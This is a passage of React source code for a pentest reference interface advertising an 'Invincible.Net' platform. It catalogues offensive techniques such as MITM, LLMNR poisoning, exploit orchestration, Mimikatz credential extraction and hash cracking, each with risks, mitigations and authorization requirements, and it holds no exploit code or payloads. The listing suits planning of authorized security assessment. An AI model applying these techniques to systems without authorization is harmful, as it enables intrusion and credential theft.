    workflow:'Configure proxy → define target scope → capture interactions → send to replay/fuzz modules → annotate findings.',
    tools:'Burp Suite (PortSwigger), OWASP ZAP',
    risks:'Credential/token exposure; accidental modification causing stateful changes in production systems.',
    mitigations:'Automatic secret redaction; read-only capture mode option; safe replay templates; explicit confirmation for state-changing requests.',
    legal:'Ensure authorization to intercept traffic; handle tokens as sensitive data.' },
  { id:'M', icon:'🤖', name:'Web DAST Automation — Passive vs Active Check Separation', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net DAST module distinguishes passive crawl results from active scan findings — separate risk tiers.',
    purpose:'Controlled automation to map application surface (crawl) and test for vulnerabilities (audit).',
    access:'Network access; may require test accounts; same-origin scope only.',
    data:'Site map, endpoints, parameters, findings, reproduction evidence, crawl graphs.',
    workflow:'Crawl to map attack surface → run passive checks → optionally enable active checks with rate limiting and strict scope → generate reports.',
    tools:'Burp Scanner, OWASP ZAP',
    risks:'Active scanning can produce load, trigger WAF/IDS, or create unwanted state changes; crawlers can hit destructive endpoints.',
    mitigations:'Scope and method allowlists; auth-aware rate limiting; safe-endpoints-only mode; kill switch; maintenance windows.',
    legal:'Ensure app owner approval, test accounts, and data-handling controls.' },
  { id:'N', icon:'🔬', name:'Packet Crafting & Custom Probe/Fuzzer Sandbox', risk:'Medium–High', riskColor:'#FF9F0A', invNet:true,
    invNetNote:'.Net fuzzer module — sandboxed workers with strict rate/mutation budgets and host health checks.',
    purpose:'Bespoke protocol testing where commercial scanners lack coverage: custom probes, negative testing, and controlled fuzzing.',
    access:'Network access; often raw socket privileges on tester host.',
    data:'Raw responses, state transitions, timing anomalies, crash indicators, pcap evidence.',
    workflow:'Build probe templates → run in sandboxed worker → capture responses and behavioral deltas → run within strict budgets.',
    tools:'Scapy, Metasploit auxiliary/fuzzer modules',
    risks:'Fuzzing can crash services; malformed packets may trigger security controls.',
    mitigations:'Default to lab/staging targets; strict rate and mutation budgets; hard host health checks; stop on error spike; explicit sign-off.',
    legal:'Treat as intrusive; ensure explicit authorization and rollback planning.' },
  { id:'O', icon:'📻', name:'Wireless Security Posture Testing Suite', risk:'Low–High', riskColor:'#FF9F0A', invNet:true,
    invNetNote:'.Net wireless module supports inventory-only mode; injection tests gated behind maintenance-window + explicit arming.',
    purpose:'Assess Wi-Fi posture: encryption/auth type inventory, channel policy compliance, rogue AP detection, and controlled injection resilience checks.',
    access:'RF proximity; injection tests require capable hardware and explicit authorization.',
    data:'SSID/BSSID/encryption posture, channel usage, client associations, event timestamps, limited capture evidence.',
    workflow:'Inventory and baseline → detect changes/rogues → (optional) run time-boxed resilience checks during maintenance windows → evidence and recommendations.',
    tools:'Aircrack-ng suite, Kismet, Wireshark',
    risks:'High disruption potential for injection-based tests (client disconnects, DoS-like effects).',
    mitigations:'Separate inventory-only and injection modes; require maintenance-window + explicit arming; automatic stop on client impact.',
    legal:'Wireless disruption must be tightly controlled and explicitly authorized.' },
  { id:'P', icon:'🎭', name:'Controlled MITM Validation Module', risk:'High', riskColor:'#FF453A', invNet:true,
    invNetNote:'.Net MITM module requires preflight approval + maintenance window — hard allowlist; real-time kill switch; auto-timeout.',
    purpose:'Validate segmentation, insecure protocol exposure, downgrade resilience, and data-in-transit controls.',
    access:'L2 adjacency; ability to position as MITM; elevated privileges on tester machine.',
    data:'Traffic metadata or payloads (highly sensitive), protocol downgrade signals, credentials in the clear (if present).',
    workflow:'Preflight approvals + maintenance window → enable MITM module with explicit targets → capture minimal evidence → immediately disable and restore.',
    tools:'Bettercap (arp.spoof module)',
    risks:'High risk: traffic disruption, confidentiality exposure, potential compliance violations.',
    mitigations:'Strict target allowlists; capture-minimization; mandatory encryption at rest; real-time kill switch; auto-timeout; require stakeholder presence.',
    legal:'Treat as highly sensitive; legal/privacy review recommended for intrusive tests.' },
  { id:'Q', icon:'☠️', name:'LLMNR/NBT-NS/mDNS Credential Exposure Simulation', risk:'High', riskColor:'#FF453A', invNet:true,
    invNetNote:'.Net poison simulation requires "arming" + isolated VLAN preference — safe alternative mode does passive detection only.',
    purpose:'Demonstrate risk of local-link name resolution poisoning and credential leakage; validate mitigations and monitoring effectiveness.',
    access:'Local network presence on target segment; often elevated privileges and controlled conditions.',
    data:'Evidence of name-resolution behavior, authentication attempts, whether credentials can be coerced to unauthorized endpoints.',
    workflow:'Confirm authorization → run controlled simulation in test VLAN or maintenance window → capture minimal evidence → immediate stop and remediation plan.',
    tools:'Responder',
    risks:'High risk: can disrupt legitimate name resolution; can capture sensitive credentials; triggers incident response if uncoordinated.',
    mitigations:'Require explicit arming; isolated test VLAN preference; short timebox; no persistence; immediate teardown.',
    legal:'Handle any captured credentials as highly sensitive; predefine whether capture is allowed and how it will be destroyed.' },
  { id:'R', icon:'🏢', name:'Windows/AD Protocol Enumeration Orchestrator', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net identity module ingests CME/Impacket results — builds AD exposure graph and trust/privilege map.',
    purpose:'Map identity infrastructure, trusts, reachable admin surfaces, and protocol exposures; support least-privilege collection.',
    access:'Network reachability; often domain user or service account credentials for deeper enumeration.',
    data:'Domain/host metadata, shares, reachable services, AD object relationships, authentication policy evidence.',
    workflow:'Start with unauthenticated metadata → add least-privilege credentials optionally → correlate to topology → prioritized remediation map.',
    tools:'CrackMapExec, Impacket',
    risks:'Enumeration can be noisy; authentication attempts can lock accounts; might trigger SOC alerts.',
    mitigations:'Lockout-aware rate limits; explicit credential spraying prohibitions unless authorized; read-only directory queries default.',
    legal:'Ensure credentials are authorized for testing and handled securely; record approvals.' },
  { id:'S', icon:'🕸', name:'Attack Path Graph Analytics & Remediation Choke-Point Mapping', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net graph store module — BloodHound-style attack path visualization with choke point remediation priorities.',
    purpose:'Turn raw identity and access data into actionable attack paths, privilege relationship graphs, and remediation priorities.',
    access:'Depends on collectors; generally directory read permissions and environment visibility.',
    data:'Node/edge relationships among users, computers, groups, sessions, privileges; timestamps and provenance.',
    workflow:'Collect identity relationship data → ingest into graph store → compute paths to high-value targets → highlight choke points.',
    tools:'BloodHound',
    risks:'Sensitive identity data exposure; potential misinterpretation if data is stale.',
    mitigations:'Strict data access controls; data freshness labeling; least-privilege collector mode; redaction of personal identifiers in exports.',
    legal:'Treat identity graphs as extremely sensitive organizational data.' },
  { id:'T', icon:'💥', name:'Exploit Orchestration Harness with Safe-Target Controls', risk:'High', riskColor:'#FF453A', invNet:true,
    invNetNote:'.Net exploit module requires allowlisted safe targets + staging preference — stops at "proof of control" threshold.',
    purpose:'Standardize exploit validation only when needed to prove impact, with strong safety controls and test environment support.',
    access:'Network reachability; confirmed vulnerable target and explicit permission; may require staging targets.',
    data:'Proof-of-exploit evidence, payload execution evidence (if allowed), logs, screenshots, rollback notes.',
    workflow:'Validate finding non-intrusively first → obtain explicit approval → run exploit in controlled manner → stop at proof of control → document.',
    tools:'Rapid7 Metasploit Framework',
    risks:'High: instability, outages, unintended lateral effects.',
    mitigations:'Require safe targets allowlist; staging environment preference; strict payload constraints; automatic rollback scripts; SOC coordination.',
    legal:'Intrusive exploitation should be explicitly authorized and timeboxed; legal involvement recommended.' },
  { id:'U', icon:'🔑', name:'Post-Exploitation Host Triage & Credential Material Exposure Checks', risk:'Very High', riskColor:'#FF453A', invNet:true,
    invNetNote:'.Net post-ex module is gated behind highest-tier approval — immediate encryption and controlled destruction of any captured material.',
    purpose:'When endpoints are in-scope, determine whether credential material is retrievable and gather minimal forensic evidence.',
    access:'Typically local admin/SYSTEM-level access on a compromised host (by design, post-exploitation).',
    data:'Credential material indicators, privileged session evidence, misconfiguration proofs, minimal system context.',
    workflow:'Only after explicit approval and successful foothold → run minimal triage checks → stop at proof of vulnerability → document and contain artifacts.',
    tools:'Mimikatz (authorized testing contexts only)',
    risks:'Very high: credential compromise risk, incident response activation, regulatory issues if mishandled.',
    mitigations:'Strict need-to-know; immediate encryption and controlled destruction; no persistence; require client-side witness.',
    legal:'Treat as highest-sensitivity operation; predefine whether credential extraction is allowed and how evidence will be handled.' },
  { id:'V', icon:'☁️', name:'Cloud Posture Assessment Suite (AWS/Azure/GCP)', risk:'Low–Medium', riskColor:'#30D158', invNet:true,
    invNetNote:'.Net cloud module ingests Prowler/ScoutSuite CSV/JSON — maps misconfigs to asset graphs and hybrid attack paths.',
    purpose:'Identify cloud misconfigurations (IAM, logging, network exposure) and produce compliance-aligned reports; correlate with on-prem findings.',
    access:'Cloud API access (read-only roles preferred); customer-provided audit credentials.',
    data:'Configurations, IAM policy metadata, network ACL/SG state, logging posture, resource inventory.',
    workflow:'Configure provider access → run posture checks → ingest structured outputs → map exposures to asset graphs and remediation playbooks.',
    tools:'Prowler, ScoutSuite, CloudMapper (AWS)',
    risks:'Overbroad cloud permissions; data sensitivity; API throttling.',
    mitigations:'Read-only roles; per-service allowlists; store only necessary metadata; avoid exporting secrets; respect API rate limits.',
    legal:'Ensure cloud account owners approve access scope and data exports.' },
  { id:'W', icon:'🐳', name:'Container, IaC & Kubernetes Posture Scanning', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net container module ingests Trivy JSON/SARIF and kube-bench results — normalized CVEs and misconfig findings.',
    purpose:'Detect vulnerabilities and misconfigurations in container images, repositories, K8s manifests, and deployed clusters.',
    access:'Repository access; cluster access for in-cluster checks; or artifact file access for offline scans.',
    data:'Vulnerability findings (CVEs), misconfiguration findings, secret detection flags, SBOMs, machine-readable reports.',
    workflow:'Scan images/IaC offline first → run in-cluster checks with least-privilege RBAC → normalize findings → report.',
    tools:'Trivy, kube-bench',
    risks:'Scans can be noisy; in-cluster checks may require privileged access; false positives.',
    mitigations:'Prefer offline image/IaC scans; least-privilege K8s RBAC; report-only mode by default.',
    legal:'Ensure authorization for cluster access and scanning intensity.' },
  { id:'X', icon:'⚔️', name:"Kubernetes Attacker's-Eye-View Probing", risk:'High', riskColor:'#FF453A', invNet:true,
    invNetNote:'.Net K8s active module — strictly owned/authorized clusters only; low-rate probing with automatic stop on error thresholds.',
    purpose:'Emulate adversary reconnaissance against exposed K8s surfaces to validate whether a cluster is hardened against common weaknesses.',
    access:'Network reachability to cluster endpoints; must be owner-authorized.',
    data:'Exposed API endpoints, misconfiguration indicators, security weakness findings.',
    workflow:'Confirm ownership → strict approvals → maintenance windows → focus on staging → low-rate probing → stop on error/latency thresholds.',
    tools:'kube-hunter',
    risks:'High in production if misused; may trigger alerts or load endpoints.',
    mitigations:'Strict approvals; maintenance windows; focus on staging; low-rate probing; automatic stop on error/latency thresholds.',
    legal:"kube-hunter's own documentation explicitly warns: do NOT run on a cluster you don't own." },
  { id:'Y', icon:'🔐', name:'Offline Password Auditing Support (Authorized Hash Testing)', risk:'Medium–High', riskColor:'#FF9F0A', invNet:true,
    invNetNote:'.Net auditing module — reporting statistics only by default; plaintext recovery requires explicit written ROE permission.',
    purpose:'Evaluate password strength from obtained hashes/captures (within ROE), emphasizing prevention and policy improvements.',
    access:'Access to password hashes/derived materials (obtained legally within engagement); compute resources.',
    data:'Hash types, cracking metrics, recovered passwords (extremely sensitive), policy weakness evidence.',
    workflow:'Obtain approved hash material → run offline auditing with strict logging and destruction policy → report only aggregated results unless explicit permission.',
    tools:'hashcat, John the Ripper',
    risks:'Handling recovered credentials can create a major security incident; may violate policy if not pre-approved.',
    mitigations:'Default to reporting statistics only; secrets redaction; immediate secure destruction; strict need-to-know access.',
    legal:'Require explicit written permission for any recovery/handling of plaintext credentials; define disclosure rules in ROE.' },
  { id:'Z', icon:'📊', name:'CVE/CVSS/CPE Normalization & Risk-to-Evidence Analytics', risk:'None (Analytic)', riskColor:'#30D158', invNet:true,
    invNetNote:'Core .Net analytics layer — cross-tool deduplication, CVSS prioritization, CPE product mapping, and trend reporting.',
    purpose:'Normalize findings across scanners into a consistent vulnerability and asset model for deduplication, prioritization, and trend analysis.',
    access:'None beyond access to tool outputs and vulnerability datasets.',
    data:'CVE IDs, CVSS vectors/scores, product naming (CPE), affected assets/services, evidence references.',
    workflow:'Parse tool outputs → map products to CPE → map to CVEs and CVSS → compute prioritization views and remediation plans.',
    tools:'NVD (U.S. government repository), CVSS scoring, CPE naming — internal normalization layer',
    risks:'Overreliance on severity scores; mis-mapping products can cause false associations.',
    mitigations:'Keep provenance; allow analyst overrides; label confidence; store raw evidence alongside normalized findings.',
    legal:'None beyond standard data handling; vulnerability datasets and outputs must be treated as sensitive.' },
]

function TabToolkit() {
  const [open, setOpen] = useState(null)
  const [filter, setFilter] = useState('all')

  const filtered = TOOLKIT_IDEAS.filter(idea => {
    if (filter === 'low')    return ['Passive / Low','Low','None (Analytic)'].includes(idea.risk) || idea.risk.startsWith('Low')
    if (filter === 'medium') return idea.risk.includes('Medium') && !idea.risk.includes('High')
    if (filter === 'high')   return idea.risk.includes('High') || idea.risk === 'Very High'
    return true
  })

  const riskBadge = (risk, color) => (
    <span style={{ fontSize:9, fontWeight:700, color, background:`${color}18`, border:`1px solid ${color}40`, borderRadius:8, padding:'2px 7px', letterSpacing:'0.05em', flexShrink:0 }}>{risk.toUpperCase()}</span>
  )

  return (
    <div style={S.section}>
      <div style={{ ...S.card, background:'linear-gradient(135deg,rgba(0,200,255,0.06),rgba(124,58,237,0.06))', borderColor:'rgba(0,200,255,0.18)', marginBottom:4 }}>
        <div style={{ fontSize:15, fontWeight:800, color:C.text, marginBottom:4 }}>Pentest Capability Reference — Ideas C–Z</div>
        <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>
          23 capability concepts organized by risk level. All require explicit authorization and ROE documentation before use. Items marked <span style={{ color:'#30D158', fontWeight:700 }}>● .NET</span> are planned or recommended integrations for Invincible.Net.
        </div>
      </div>

      {/* Filter bar */}
      <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginBottom:4 }}>
        {[['all','All','rgba(0,200,255,0.15)',C.accent],['low','Passive / Low','rgba(48,209,88,0.15)','#30D158'],['medium','Medium','rgba(255,214,10,0.15)','#FFD60A'],['high','High / Very High','rgba(255,69,58,0.15)',C.red]].map(([val,label,bg,col]) => (
          <button key={val} onClick={() => setFilter(val)} style={{ ...S.btn(filter===val ? col : C.dim2), background: filter===val ? bg : 'transparent', border:`1px solid ${filter===val ? col+'60' : C.border}`, fontSize:10, padding:'4px 10px' }}>{label}</button>
        ))}
      </div>

      {filtered.map(idea => (
        <div key={idea.id} style={{ ...S.card, padding:0, overflow:'hidden' }}>
          <button onClick={() => setOpen(open === idea.id ? null : idea.id)} style={{ width:'100%', display:'flex', alignItems:'center', gap:10, padding:'11px 14px', background:'none', border:'none', color:C.text, cursor:'pointer', textAlign:'left', fontFamily:C.font }}>
            <span style={{ fontSize:18, letterSpacing:'-0.02em', flexShrink:0 }}>{idea.icon}</span>
            <span style={{ display:'flex', flexDirection:'column', gap:3, flex:1, minWidth:0 }}>
              <span style={{ display:'flex', alignItems:'center', gap:8, flexWrap:'wrap' }}>
                <span style={{ fontSize:10, fontWeight:700, color:C.dim2, letterSpacing:'0.12em', flexShrink:0 }}>IDEA {idea.id}</span>
                {riskBadge(idea.risk, idea.riskColor)}
                {idea.invNet && <span style={{ fontSize:9, fontWeight:700, color:'#30D158', background:'rgba(48,209,88,0.12)', border:'1px solid rgba(48,209,88,0.3)', borderRadius:8, padding:'2px 7px', flexShrink:0 }}>● .NET</span>}
              </span>
              <span style={{ fontSize:12, fontWeight:700, color:C.text, lineHeight:1.3 }}>{idea.name}</span>
            </span>
            <span style={{ fontSize:10, color:C.dim2, transform: open===idea.id ? 'rotate(90deg)' : 'none', transition:'transform 0.2s', flexShrink:0 }}>▶</span>
          </button>
          {open === idea.id && (
            <div style={{ padding:'0 14px 14px', borderTop:`1px solid ${C.border}`, paddingTop:12, display:'flex', flexDirection:'column', gap:8 }}>
              {idea.invNet && (
                <div style={{ ...S.card, background:'rgba(48,209,88,0.04)', borderColor:'rgba(48,209,88,0.2)', padding:'8px 12px' }}>
                  <div style={{ fontSize:10, fontWeight:700, color:'#30D158', marginBottom:3, letterSpacing:'0.08em' }}>INVINCIBLE.NET INTEGRATION</div>
                  <div style={{ fontSize:11, color:C.dim, lineHeight:1.5 }}>{idea.invNetNote}</div>
                </div>
              )}
              {[
                ['Purpose', idea.purpose, C.accent],
                ['Required Access', idea.access, C.orange],
                ['Data Collected', idea.data, C.dim],
                ['Typical Workflow', idea.workflow, C.dim],
                ['Example Tools', idea.tools, '#AF52DE'],
                ['Risks / Impact', idea.risks, C.red],
                ['Mitigations', idea.mitigations, C.green],
                ['Legal / Ethical', idea.legal, C.orange],
              ].map(([label, val, col]) => (
                <div key={label} style={{ display:'flex', gap:8, fontSize:11 }}>
                  <span style={{ color:C.dim2, fontWeight:700, fontSize:10, minWidth:110, flexShrink:0, paddingTop:1 }}>{label.toUpperCase()}</span>
                  <span style={{ color:col, lineHeight:1.5, flex:1 }}>{val}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      ))}

      <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', fontSize:11, color:C.dim2, lineHeight:1.8, marginTop:4 }}>
        <strong style={{ color:C.dim }}>Authorization reminder:</strong> Every technique listed here requires explicit written authorization, documented ROE, and defined scope. Some require secondary approval, maintenance windows, or client-side witnesses. When in doubt, default to the passive/safe mode variant.
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// .Net tab — Invincible.Net pentest platform advertising & tool reference
// ─────────────────────────────────────────────────────────────────────────────
const NET_TOOLS = [
  { tool:'Nmap', cap:'Host/service discovery, port/service/version info, scripted enumeration', risk:'Low → High', access:'Network reachability', outputs:'XML/structured results; human logs', net:true },
  { tool:'Wireshark / dumpcap', cap:'Packet capture + analysis', risk:'Passive (sensitive)', access:'SPAN/TAP or host capture', outputs:'PCAPNG/PCAP; filtered views', net:true },
  { tool:'Kismet', cap:'Wireless detection/sniffing/WIDS + API', risk:'Passive → Low', access:'RF proximity + monitor mode', outputs:'kismetdb, JSON/API, pcap-ng', net:true },
  { tool:'Aircrack-ng suite', cap:'Wi-Fi assessment (monitoring, injection, testing)', risk:'Medium → High', access:'RF proximity + injection hardware', outputs:'Captures/logs; Wi-Fi evidence', net:true },
  { tool:'Scapy', cap:'Programmable packet crafting/sniffing', risk:'Low → High', access:'Often raw socket privileges', outputs:'Custom JSON, pcaps, raw responses', net:true },
  { tool:'Nessus (Tenable)', cap:'Vulnerability scanning, plugin-based checks', risk:'Medium → High', access:'Network reachability; creds optional', outputs:'.nessus XML, PDF/HTML/CSV', net:true },
  { tool:'OpenVAS/GVM', cap:'Vulnerability scanning with daily test feeds', risk:'Medium', access:'Network reachability; creds optional', outputs:'VT results via GMP/API', net:true },
  { tool:'Burp Suite', cap:'Web proxy + DAST scanning + manual tooling', risk:'Medium', access:'Browser proxy path to target', outputs:'Request/response logs; scan issues', net:true },
  { tool:'OWASP ZAP', cap:'Open-source web proxy/scanner', risk:'Medium', access:'Browser proxy path to target', outputs:'Alerts; request/response evidence', net:true },
  { tool:'Metasploit', cap:'Exploit, auxiliary (scanners/fuzzers/DoS), post-exploitation', risk:'High', access:'Authorized target; often foothold', outputs:'Module run logs; exploitation evidence', net:true },
  { tool:'Impacket', cap:'Low-level protocol tooling (SMB/MSRPC etc.)', risk:'Medium → High', access:'Network access; often creds', outputs:'Script outputs; protocol artifacts', net:true },
  { tool:'Responder', cap:'Local-link name resolution poisoning + rogue auth servers', risk:'High', access:'Local segment presence', outputs:'Captured auth attempts; event logs', net:true },
  { tool:'CrackMapExec', cap:'AD network assessment automation ("living off the land")', risk:'Medium → High', access:'Network access; often domain creds', outputs:'Enumeration results; execution logs', net:true },
  { tool:'BloodHound', cap:'AD/Entra relationship graph and attack path analysis', risk:'Medium', access:'Directory visibility; collector access', outputs:'Graph dataset; attack path results', net:true },
  { tool:'Mimikatz', cap:'Credential dumping / auth material extraction (post-exploitation)', risk:'Very High', access:'Local admin/SYSTEM on Windows host', outputs:'Credential artifact evidence, logs', net:true },
  { tool:'Prowler', cap:'Cloud security/compliance checks + reporting', risk:'Low → Medium', access:'Cloud API read roles', outputs:'CSV/JSON/HTML outputs', net:true },
  { tool:'ScoutSuite', cap:'Multi-cloud security auditing via provider APIs', risk:'Low → Medium', access:'Cloud API read roles', outputs:'Findings + report artifacts', net:true },
  { tool:'CloudMapper', cap:'AWS analysis + auditing (network viz; legacy/unmaintained)', risk:'Low', access:'AWS read roles', outputs:'Inventory/audit artifacts', net:true },
  { tool:'Trivy', cap:'Container/IaC/K8s scanning + varied reporting', risk:'Low', access:'Artifact/cluster access', outputs:'Table/JSON/SARIF/SBOM', net:true },
  { tool:'kube-bench', cap:'CIS benchmark checks for Kubernetes', risk:'Low → Medium', access:'Cluster access (varies)', outputs:'Benchmark check results', net:true },
  { tool:'kube-hunter', cap:'Kubernetes weakness probing ("attacker view")', risk:'High', access:'Network reachability to cluster; ownership required', outputs:'Findings/report artifacts', net:true },
  { tool:'hashcat', cap:'Advanced offline password recovery / hash auditing', risk:'Medium → High', access:'Hash material (legally obtained); compute', outputs:'Cracking metrics; policy evidence', net:true },
  { tool:'John the Ripper', cap:'Password auditing; detect weak passwords; many hash types', risk:'Medium', access:'Hash material (legally obtained)', outputs:'Cracking results; policy evidence', net:true },
]

const NET_MODULES = [
  { phase:'1 — Passive Recon', color:'#30D158', items:['Wired traffic capture (pcapng ingestion)', 'Wireless RF survey (Kismet API)', 'Broadcast/multicast service discovery', 'Layer-2 topology (LLDP/CDP + SNMP)'] },
  { phase:'2 — Active Discovery', color:'#FFD60A', items:['Host discovery with ARP/ICMP pacing', 'Port/service/version scanning (Nmap XML)', 'Scripted enumeration (NSE risk-tier gating)', 'Web surface mapping (Burp/ZAP crawl)'] },
  { phase:'3 — Vulnerability Assessment', color:'#FF9F0A', items:['Nessus integration (safe checks default)', 'OpenVAS/GVM (GMP API orchestration)', 'Web DAST (passive vs active separation)', 'Cloud posture (Prowler/ScoutSuite ingestion)', 'Container/K8s scanning (Trivy/kube-bench)'] },
  { phase:'4 — Identity & Attack Path', color:'#FF9F0A', items:['Windows/AD protocol enumeration (CME/Impacket)', 'Attack path graph analytics (BloodHound-style)', 'LLMNR/NBT-NS exposure simulation (gated)', 'CVE/CVSS/CPE normalization layer (Idea Z)'] },
  { phase:'5 — Validation (Auth Only)', color:'#FF453A', items:['Controlled MITM validation (kill switch + timeout)', 'Packet crafting/fuzzer sandbox (lab targets default)', 'Exploit orchestration (stops at proof-of-control)', 'Post-exploitation triage (highest-tier approval)', 'K8s attacker-view probing (owned clusters only)', 'Offline password auditing (stats-only default)'] },
]

function TabNetLab() {
  const [toolSearch, setToolSearch] = useState('')
  const [openModule, setOpenModule] = useState(null)

  const filtered = NET_TOOLS.filter(t =>
    t.tool.toLowerCase().includes(toolSearch.toLowerCase()) ||
    t.cap.toLowerCase().includes(toolSearch.toLowerCase())
  )

  const riskColor = (r) => {
    if (r.includes('Very High') || r === 'High') return C.red
    if (r.includes('High') || r.includes('Medium')) return '#FF9F0A'
    if (r.includes('Low') || r.includes('Passive')) return '#30D158'
    return C.dim
  }

  return (
    <div style={S.section}>
      {/* Header */}
      <div style={{ ...S.card, background:'linear-gradient(135deg,rgba(0,200,255,0.08),rgba(124,58,237,0.08))', borderColor:'rgba(0,200,255,0.25)', padding:'18px 18px' }}>
        <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:10 }}>
          <span style={{ fontSize:28 }}>🛡</span>
          <div>
            <div style={{ fontSize:20, fontWeight:800, ...S.gradText(C.gradA) }}>Invincible.Net</div>
            <div style={{ fontSize:11, color:C.dim, letterSpacing:'0.1em' }}>PROFESSIONAL PENTEST PLATFORM</div>
          </div>
        </div>
        <div style={{ fontSize:12, color:C.dim, lineHeight:1.7 }}>
          A safety-first orchestration platform for authorized security assessments. Invincible.Net wraps industry-standard tools with ROE enforcement, normalized evidence management, and structured reporting — letting testers focus on findings rather than tooling overhead.
        </div>
        <div style={{ display:'flex', gap:8, flexWrap:'wrap', marginTop:12 }}>
          {['ROE/Scope Enforcement','Authorization Gating','Safe-Mode Defaults','Evidence Vault','Normalized Schema','Cross-Tool Correlation','Diff & Regression Reports','Graph-Based Attack Paths'].map(tag => (
            <span key={tag} style={{ fontSize:9, fontWeight:700, color:C.accent, background:'rgba(0,200,255,0.1)', border:'1px solid rgba(0,200,255,0.2)', borderRadius:8, padding:'3px 8px', letterSpacing:'0.05em' }}>{tag}</span>
          ))}
        </div>
      </div>

      {/* Architecture overview */}
      <div style={S.label}>Architecture — Core Modules</div>
      {NET_MODULES.map(mod => (
        <div key={mod.phase} style={{ ...S.card, padding:0, overflow:'hidden' }}>
          <button onClick={() => setOpenModule(openModule===mod.phase ? null : mod.phase)} style={{ width:'100%', display:'flex', alignItems:'center', gap:10, padding:'11px 14px', background:'none', border:'none', color:C.text, cursor:'pointer', textAlign:'left', fontFamily:C.font }}>
            <span style={{ width:8, height:8, borderRadius:'50%', background:mod.color, flexShrink:0 }} />
            <span style={{ flex:1, fontSize:12, fontWeight:700, color:C.text }}>{mod.phase}</span>
            <span style={{ fontSize:10, color:C.dim2, transform: openModule===mod.phase ? 'rotate(90deg)' : 'none', transition:'transform 0.2s' }}>▶</span>
          </button>
          {openModule === mod.phase && (
            <div style={{ padding:'0 14px 14px', borderTop:`1px solid ${C.border}`, paddingTop:10 }}>
              {mod.items.map(item => (
                <div key={item} style={{ display:'flex', alignItems:'flex-start', gap:8, padding:'4px 0', fontSize:11, color:C.dim, borderBottom:`1px solid ${C.border}` }}>
                  <span style={{ color:mod.color, flexShrink:0, fontSize:10, marginTop:2 }}>▸</span>
                  {item}
                </div>
              ))}
            </div>
          )}
        </div>
      ))}

      {/* Design principles */}
      <div style={S.label}>Design Principles</div>
      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:8 }}>
        {[
          ['🛡','Safety First','Safe-mode is the default for every module. Intrusive actions require explicit gating, secondary approval, and defined maintenance windows.'],
          ['📋','ROE Enforcement','Scope allowlists, technique gating, time windows, and authorized targets are enforced before any job runs.'],
          ['🗃','Normalized Evidence','All tool outputs are parsed into a shared schema — Assets, Services, Vulns, Evidence, Relationships — with raw artifacts preserved.'],
          ['🔗','Cross-Tool Correlation','Deduplication, confidence scoring, topology graphs, and timelines unify data across passive captures, scanners, and identity tools.'],
          ['📈','Diff & Regression','"New exposures since last run" and remediation verification reports drive prioritization and track remediation progress.'],
          ['🔒','Evidence Vault','Encrypted storage, retention policies, redaction controls, and sanitized export — aligned to SP 800-115 data-handling requirements.'],
        ].map(([icon,title,desc]) => (
          <div key={title} style={{ ...S.card, padding:'10px 12px' }}>
            <div style={{ display:'flex', alignItems:'center', gap:6, marginBottom:5 }}>
              <span style={{ fontSize:16 }}>{icon}</span>
              <span style={{ fontSize:11, fontWeight:700, color:C.text }}>{title}</span>
            </div>
            <div style={{ fontSize:10, color:C.dim, lineHeight:1.5 }}>{desc}</div>
          </div>
        ))}
      </div>

      {/* Three-pane UI mockup */}
      <div style={S.label}>Reference UI Layout</div>
      <div style={{ ...S.card, fontFamily:'monospace', fontSize:10, color:C.dim, lineHeight:1.7, whiteSpace:'pre', overflowX:'auto', background:'rgba(0,200,255,0.02)' }}>{
`┌─────────────────────────────── Pentest Workspace ──────────────────────────────┐
│ Engagement: [Name] | Mode: SAFE (Passive/Low-Risk) | Window: 02:00–04:00 UTC  │
├───────────────┬────────────────────────────┬──────────────────────────────────┤
│ Scope & Assets│ Findings / Paths / Diffs   │ Evidence & Notes                 │
│ ─ Subnet A    │ ─ New exposed services     │ ─ Raw artifacts (pcap, xml, …)   │
│ ─ WiFi Floor 2│ ─ Critical vulns (CVE)     │ ─ Provenance + timestamps        │
│ ─ AWS Account │ ─ Attack paths to DA       │ ─ Annotated screenshots          │
│ ─ K8s Cluster │ ─ Config gaps              │ ─ Export controls (redaction)    │
└───────────────┴────────────────────────────┴──────────────────────────────────┘`
      }</div>

      {/* Tool table */}
      <div style={S.label}>Integrated Tool Reference</div>
      <input
        style={{ ...S.input, marginBottom:8 }}
        placeholder="Search tools or capabilities…"
        value={toolSearch}
        onChange={e => setToolSearch(e.target.value)}
      />
      <div style={{ ...S.card, padding:0, overflow:'hidden' }}>
        {/* Header row */}
        <div style={{ display:'grid', gridTemplateColumns:'140px 1fr 90px', gap:0, padding:'8px 12px', borderBottom:`1px solid ${C.border}`, background:'rgba(0,200,255,0.04)' }}>
          {['Tool','Primary Capability','Risk Level'].map(h => (
            <div key={h} style={{ fontSize:9, fontWeight:700, color:C.dim2, letterSpacing:'0.1em', textTransform:'uppercase' }}>{h}</div>
          ))}
        </div>
        {filtered.map((t, i) => (
          <div key={t.tool} style={{ display:'grid', gridTemplateColumns:'140px 1fr 90px', gap:0, padding:'8px 12px', borderBottom: i < filtered.length-1 ? `1px solid ${C.border}` : 'none', alignItems:'start' }}>
            <div style={{ fontSize:11, fontWeight:700, color:C.text, paddingRight:8 }}>{t.tool}</div>
            <div style={{ fontSize:10, color:C.dim, lineHeight:1.5, paddingRight:8 }}>{t.cap}</div>
            <div style={{ fontSize:9, fontWeight:700, color:riskColor(t.risk) }}>{t.risk}</div>
          </div>
        ))}
        {filtered.length === 0 && (
          <div style={{ padding:'16px 12px', fontSize:11, color:C.dim2, textAlign:'center' }}>No tools match "{toolSearch}"</div>
        )}
      </div>

      {/* MVP Roadmap */}
      <div style={S.label}>Implementation Roadmap</div>
      {[
        { phase:'MVP — Safety-First Recon & Evidence Platform', color:'#30D158', items:[
          'ROE/scope enforcement, approvals, audit logging, and safe-mode gating',
          'Evidence vault with encryption, retention, and sanitized exports (SP 800-115 aligned)',
          'Nmap integration with XML ingestion; baseline/diff reporting',
          'Passive capture ingestion (pcapng) with privacy filters and protocol metadata',
